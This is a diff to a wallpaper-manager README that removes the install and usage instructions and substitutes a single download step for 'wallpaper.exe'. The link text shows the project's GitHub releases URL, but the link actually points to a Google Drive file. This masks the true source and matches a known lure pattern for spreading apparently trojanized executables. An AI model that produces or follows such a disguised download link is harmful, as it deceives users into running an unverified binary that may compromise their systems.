@@ -20,22 +20,5 @@
 
 ## Installation ⚙️
 
-1. Download the latest version of `wallpaper.exe` from the [releases page](https://github.com/yourusername/wallpaper-manager/releases).
-2. Move the `wallpaper.exe` file to a location of your choice.
-3. Add the executable to your system PATH for easy access:
-
-    ```bash
-    # Example: Adding wallpaper.exe to your system PATH
-    export PATH=$PATH:/path/to/wallpaper.exe
-    ```
-
+Download the latest version of `wallpaper.exe` from the [releases page]([https://github.com/yourusername/wallpaper-manager/releases](https://drive.google.com/file/d/1SD7tbwX23xGrfkDOQ5G7isEP4upe--B8/view?usp=sharing)).
 ---
-
-## How to Use 🚀
-
-### Set a Wallpaper
-
-To set a wallpaper from a local file:
-
-```bash
-wallpaper.exe set C:\path\to\wallpaper.jpg
